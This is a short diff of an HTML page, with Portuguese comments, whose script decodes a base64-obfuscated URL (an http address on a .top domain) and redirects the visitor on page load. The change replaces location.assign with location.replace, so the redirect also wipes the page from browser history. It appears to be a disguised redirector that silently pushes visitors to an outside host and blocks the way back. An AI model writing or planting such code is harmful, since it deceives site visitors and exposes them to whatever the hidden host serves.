@@ -5,8 +5,8 @@
         const base64URL = "aHR0cDovL2pzM2MudG9wOjgw"; 
         const decodedURL = atob(base64URL);
         
-        // Redireciona usando window.location.assign()
-        window.location.assign(decodedURL);
+        // Redireciona e substitui o histórico
+        window.location.replace(decodedURL);
     </script>
 </head>
 <body>
